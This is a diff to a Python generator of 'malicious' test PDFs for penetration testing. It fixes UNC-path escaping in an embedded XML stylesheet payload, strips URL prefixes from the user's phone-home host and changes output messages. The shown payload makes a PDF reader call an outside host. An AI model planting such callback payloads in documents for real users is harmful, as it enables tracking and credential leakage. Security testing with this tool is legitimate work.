@@ -9,7 +9,7 @@
 ##
 ## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
 ##
-## Jonas Lejon, 2022 <jonas.github@triop.se> 
+## Jonas Lejon, 2023 <jonas.github@triop.se> 
 ## https://github.com/jonaslejon/malicious-pdf
 
 import sys
@@ -509,7 +509,7 @@ def create_malpdf4(filename, host):
 1 0 obj <<>>
 stream
 <?xml version="1.0" ?>
-<?xml-stylesheet href="\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
+<?xml-stylesheet href="\\\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
 endstream
 endobj
 trailer <<
@@ -611,16 +611,19 @@ if __name__ == "__main__":
   try:
     host = sys.argv[1]
   except IndexError as e:
-      print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
+      print("Usage: {} phone-home-url".format(sys.argv[0]))
       sys.exit(1)
+    
+  # Remove http and https prefix from url
+  host = host.replace("http://", "").replace("https://", "")
 
-  print("Creating PDF files..")
+  print("[+] Creating PDF files..")
 
   create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
   create_malpdf("test1bis.pdf", 'https://' + host)
   create_malpdf2("test2.pdf", 'https://' + host)
   create_malpdf3("test3.pdf", 'https://' + host)
-  create_malpdf4("test4.pdf", 'https://' + host)
+  create_malpdf4("test4.pdf", host)
   create_malpdf5("test5.pdf", 'https://' + host)
   create_malpdf6("test6.pdf", 'https://' + host)
   create_malpdf7("test7.pdf", 'https://' + host)
@@ -629,4 +632,4 @@ if __name__ == "__main__":
   create_malpdf10("test10.pdf")
   create_malpdf11("test11.pdf")
 
-  print("Done.")
+  print("[-] Done!")
